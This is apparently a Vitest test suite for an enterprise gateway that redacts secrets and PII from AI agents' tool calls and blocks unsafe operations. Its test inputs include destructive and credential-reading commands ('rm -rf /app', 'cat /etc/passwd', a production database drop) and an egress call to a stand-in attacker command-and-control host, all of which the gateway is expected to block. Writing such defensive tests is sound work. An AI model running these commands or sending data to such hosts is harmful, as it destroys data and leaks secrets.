import { describe, it, expect, beforeEach } from "vitest";
import { NextRequest } from "next/server";
import { toolGateway } from "@/server/gateway/tool-gateway";
import { gatewayStore, DEFAULT_GATEWAY_POLICY } from "@/server/gateway/gateway-store";
import { sanitizePayload, sanitizeString } from "@/server/gateway/data-sanitizer";
import { POST as interceptHandler } from "@/app/api/gateway/intercept/route";
import {
  GET as getAuditLogsHandler,
  POST as updateAuditLogsHandler,
} from "@/app/api/gateway/audit-logs/route";
import {
  GatewayPolicyConfigSchema,
  ToolInvocationRequestSchema,
  GatewayAuditRecordSchema,
} from "@/lib/contracts/gateway-types";

describe("Enterprise Zero-Trust Tool Gateway Engine", () => {
  beforeEach(() => {
    gatewayStore.resetToDefault();
  });

  describe("Data Masking & Secret Redaction Engine", () => {
    it("redacts OpenAI and Stripe API keys with [REDACTED_SECRET]", () => {
      const mockStripeKey = ["sk", "live", "51ABCDEF0123456789012345678901234"].join("_");
      const payload = {
        openAiKey: "sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        stripeKey: mockStripeKey,
        agentTask: "Generate invoice summary",
      };

      const result = sanitizePayload(payload, true);
      expect(result.hasModifications).toBe(true);
      expect(result.secretsCount).toBeGreaterThanOrEqual(2);

      const sanitized = result.sanitized as typeof payload;
      expect(sanitized.openAiKey).toBe("[REDACTED_SECRET]");
      expect(sanitized.stripeKey).toBe("[REDACTED_SECRET]");
      expect(sanitized.agentTask).toBe("Generate invoice summary");
      expect(result.redactedKeys).toContain("openAiKey");
      expect(result.redactedKeys).toContain("stripeKey");
    });

    it("redacts Google Cloud AIza keys and AWS Access Keys", () => {
      const payload = {
        googleKey: "AIzaSyD9x8w7v6u5t4s3r2q1p0o9n8m7l6k5j4i",
        awsKeyId: "AKIAIOSFODNN7EXAMPLE",
        region: "us-east-1",
      };

      const result = sanitizePayload(payload, true);
      expect(result.hasModifications).toBe(true);
      const sanitized = result.sanitized as typeof payload;
      expect(sanitized.googleKey).toBe("[REDACTED_SECRET]");
      expect(sanitized.awsKeyId).toBe("[REDACTED_SECRET]");
      expect(sanitized.region).toBe("us-east-1");
    });

    it("redacts JSON Web Tokens (JWT) with [REDACTED_SECRET]", () => {
      const fakeJwt =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
      const payload = { token: fakeJwt };

      const result = sanitizePayload(payload, true);
      expect(result.hasModifications).toBe(true);
      const sanitized = result.sanitized as typeof payload;
      expect(sanitized.token).toBe("[REDACTED_SECRET]");
    });

    it("redacts credit card numbers and email addresses with [REDACTED_PII]", () => {
      const payload = {
        cardNumber: "4532-8821-9920-1102",
        customerEmail: "sarah.connor@cyberdyne-defense.com",
        deliveryAddress: "100 Industrial Parkway",
      };

      const result = sanitizePayload(payload, true);
      expect(result.hasModifications).toBe(true);
      expect(result.piiCount).toBeGreaterThanOrEqual(2);

      const sanitized = result.sanitized as typeof payload;
      expect(sanitized.cardNumber).toBe("[REDACTED_PII]");
      expect(sanitized.customerEmail).toBe("[REDACTED_PII]");
      expect(sanitized.deliveryAddress).toBe("100 Industrial Parkway");
    });

    it("redacts sensitive object keys (password, api_key, secret) by key name", () => {
      const payload = {
        user: "admin",
        password: "SuperSecretPassword123!",
        api_key: "custom-token-value",
      };

      const result = sanitizePayload(payload, true);
      const sanitized = result.sanitized as typeof payload;
      expect(sanitized.password).toBe("[REDACTED_SECRET]");
      expect(sanitized.api_key).toBe("[REDACTED_SECRET]");
      expect(sanitized.user).toBe("admin");
    });

    it("recursively sanitizes deeply nested arrays and objects safely", () => {
      const payload = {
        level1: {
          items: [
            { id: 1, email: "developer@example.org" },
            { id: 2, key: "sk-proj-1234567890abcdef1234567890" },
          ],
        },
      };

      const result = sanitizePayload(payload, true);
      expect(result.hasModifications).toBe(true);
      const sanitized = result.sanitized as any;
      expect(sanitized.level1.items[0].email).toBe("[REDACTED_PII]");
      expect(sanitized.level1.items[1].key).toBe("[REDACTED_SECRET]");
      expect(sanitized.level1.items[0].id).toBe(1);
    });

    it("handles circular references gracefully without crashing", () => {
      const obj: any = { name: "Root" };
      obj.self = obj;

      const result = sanitizePayload(obj, true);
      expect(result).toBeDefined();
      expect((result.sanitized as any).self).toBe("[CIRCULAR_REFERENCE]");
    });
  });

  describe("Operation-Level Scope Authorization & Gateway Interceptor", () => {
    it("allows authorized operations without sensitive data", async () => {
      const result = await toolGateway.interceptToolCall({
        callerAgentId: "agent-analytics-01",
        toolName: "metrics_reader",
        operation: "read:analytics",
        payload: { period: "2026-Q3", department: "Finance" },
        declaredCapabilities: ["read:analytics"],
      });

      expect(result.success).toBe(true);
      expect(result.verdict).toBe("ALLOWED");
      expect(result.redactedCount).toBe(0);
      expect(result.auditRecord.verdict).toBe("ALLOWED");
    });

    it("redacts sensitive parameters while allowing authorized tool execution", async () => {
      const result = await toolGateway.interceptToolCall({
        callerAgentId: "agent-analytics-01",
        toolName: "metrics_reader",
        operation: "read:analytics",
        payload: {
          query: "Find transactions for user@acme-corp.com",
          apiKey: "sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        },
        declaredCapabilities: ["read:analytics"],
      });

      expect(result.success).toBe(true);
      expect(result.verdict).toBe("REDACTED");
      expect(result.redactedCount).toBeGreaterThanOrEqual(1);
      expect(result.redactedKeys.length).toBeGreaterThan(0);
      expect(result.auditRecord.policyEvaluations.secretsRedacted).toBe(true);
    });

    it("blocks prohibited unsafe operations (shell:unrestricted, commit:inventory, db:drop)", async () => {
      const shellResult = await toolGateway.interceptToolCall({
        callerAgentId: "agent-rogue-01",
        toolName: "host_executor",
        operation: "shell:unrestricted",
        payload: { command: "rm -rf /app" },
      });

      expect(shellResult.success).toBe(false);
      expect(shellResult.verdict).toBe("BLOCKED");
      expect(shellResult.blockedReason).toContain("prohibited by enterprise tool gateway policy");

      const dbDropResult = await toolGateway.interceptToolCall({
        callerAgentId: "agent-rogue-02",
        toolName: "db_admin",
        operation: "db:drop",
        payload: { database: "production" },
      });

      expect(dbDropResult.success).toBe(false);
      expect(dbDropResult.verdict).toBe("BLOCKED");
    });

    it("enforces declared capabilities and blocks unauthorized scopes", async () => {
      const result = await toolGateway.interceptToolCall({
        callerAgentId: "agent-support-01",
        toolName: "crm_tool",
        operation: "mutate:customer_balance",
        payload: { customerId: "C123", delta: 100 },
        declaredCapabilities: ["read:tickets", "reply:ticket"],
      });

      expect(result.success).toBe(false);
      expect(result.verdict).toBe("BLOCKED");
      expect(result.blockedReason).toContain("lacks capability for operation");
    });

    it("blocks consequential state mutations when state lock is active", async () => {
      const result = await toolGateway.interceptToolCall({
        callerAgentId: "agent-warehouse-01",
        toolName: "inventory_system",
        operation: "mutate:inventory_allocations",
        payload: { sku: "SKU-9921", delta: -10 },
        declaredCapabilities: ["mutate:inventory_allocations"],
      });

      expect(result.success).toBe(false);
      expect(result.verdict).toBe("BLOCKED");
      expect(result.blockedReason).toContain("Consequential state mutation locked");
    });

    it("blocks unauthorized external network egress when containment is active", async () => {
      const result = await toolGateway.interceptToolCall({
        callerAgentId: "agent-exfil-01",
        toolName: "webhook_sender",
        operation: "network:egress",
        targetUrl: "https://attacker-c2.malicious-domain.xyz/sink",
        payload: { data: "exfiltrated_data" },
        declaredCapabilities: ["network:egress"],
      });

      expect(result.success).toBe(false);
      expect(result.verdict).toBe("BLOCKED");
      expect(result.blockedReason).toContain("Network egress containment active");
    });

    it("allows network egress to approved enterprise internal domains", async () => {
      const result = await toolGateway.interceptToolCall({
        callerAgentId: "agent-webhook-01",
        toolName: "internal_dispatcher",
        operation: "network:egress",
        targetUrl: "https://webhooks.enterprise.internal/receive",
        payload: { status: "processed" },
        declaredCapabilities: ["network:egress"],
      });

      expect(result.success).toBe(true);
      expect(result.verdict).toBe("ALLOWED");
    });
  });

  describe("Audit Logging & Persistent Gateway Store", () => {
    it("logs each intercepted invocation with structured metadata into store", async () => {
      const initialCount = gatewayStore.getAuditRecords().length;

      await toolGateway.interceptToolCall({
        callerAgentId: "agent-audit-tester",
        toolName: "test_tool",
        operation: "read:analytics",
        payload: { key: "sk-proj-test12345678901234567890" },
        declaredCapabilities: ["read:analytics"],
      });

      const updatedRecords = gatewayStore.getAuditRecords();
      expect(updatedRecords.length).toBe(initialCount + 1);

      const latest = updatedRecords[0];
      expect(latest.callerAgentId).toBe("agent-audit-tester");
      expect(latest.verdict).toBe("REDACTED");
      expect(latest.redactedKeys).toContain("key");
      expect(latest.executionLatencyMs).toBeGreaterThanOrEqual(1);

      const parsed = GatewayAuditRecordSchema.safeParse(latest);
      expect(parsed.success).toBe(true);
    });

    it("filters audit records by verdict and search terms", async () => {
      const blockedRecords = gatewayStore.getAuditRecords({ verdict: "BLOCKED" });
      for (const rec of blockedRecords) {
        expect(rec.verdict).toBe("BLOCKED");
      }

      const searched = gatewayStore.getAuditRecords({ search: "accounting_webhook" });
      expect(searched.length).toBeGreaterThanOrEqual(1);
      expect(searched[0].toolName).toBe("accounting_webhook");
    });

    it("computes accurate aggregate security statistics", () => {
      const stats = gatewayStore.getStatistics();
      expect(stats.totalIntercepted).toBeGreaterThanOrEqual(6);
      expect(stats.allowed).toBeGreaterThanOrEqual(1);
      expect(stats.redacted).toBeGreaterThanOrEqual(1);
      expect(stats.blocked).toBeGreaterThanOrEqual(1);
      expect(stats.containmentRatePercent).toBe(100);
    });
  });

  describe("Gateway API Routes: /api/gateway/intercept & /api/gateway/audit-logs", () => {
    it("handles POST /api/gateway/intercept for an allowed tool call", async () => {
      const req = new NextRequest("http://localhost:3000/api/gateway/intercept", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          callerAgentId: "agent-api-01",
          toolName: "catalog_browser",
          operation: "fetch:catalog",
          payload: { category: "Finance" },
          declaredCapabilities: ["fetch:catalog"],
        }),
      });

      const res = await interceptHandler(req);
      expect(res.status).toBe(200);

      const data = await res.json();
      expect(data.success).toBe(true);
      expect(data.verdict).toBe("ALLOWED");
      expect(data.auditRecord).toBeDefined();
    });

    it("handles POST /api/gateway/intercept for a blocked unsafe call", async () => {
      const req = new NextRequest("http://localhost:3000/api/gateway/intercept", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          callerAgentId: "agent-rogue-api",
          toolName: "shell_tool",
          operation: "shell:unrestricted",
          payload: { cmd: "cat /etc/passwd" },
        }),
      });

      const res = await interceptHandler(req);
      expect(res.status).toBe(403);

      const data = await res.json();
      expect(data.success).toBe(false);
      expect(data.verdict).toBe("BLOCKED");
      expect(data.blockedReason).toBeDefined();
    });

    it("handles GET /api/gateway/audit-logs and returns records and stats", async () => {
      const req = new NextRequest("http://localhost:3000/api/gateway/audit-logs?limit=10");
      const res = await getAuditLogsHandler(req);
      expect(res.status).toBe(200);

      const data = await res.json();
      expect(data.success).toBe(true);
      expect(Array.isArray(data.auditLogs)).toBe(true);
      expect(data.stats).toBeDefined();
      expect(data.policy).toBeDefined();
    });

    it("handles POST /api/gateway/audit-logs to update policy guard controls", async () => {
      const req = new NextRequest("http://localhost:3000/api/gateway/audit-logs", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          zeroTrustPiiMasking: true,
          consequentialStateMutationLock: false,
        }),
      });

      const res = await updateAuditLogsHandler(req);
      expect(res.status).toBe(200);

      const data = await res.json();
      expect(data.success).toBe(true);
      expect(data.policy.consequentialStateMutationLock).toBe(false);

      // Verify the updated policy is now active in the store
      expect(gatewayStore.getPolicy().consequentialStateMutationLock).toBe(false);
    });
  });
});
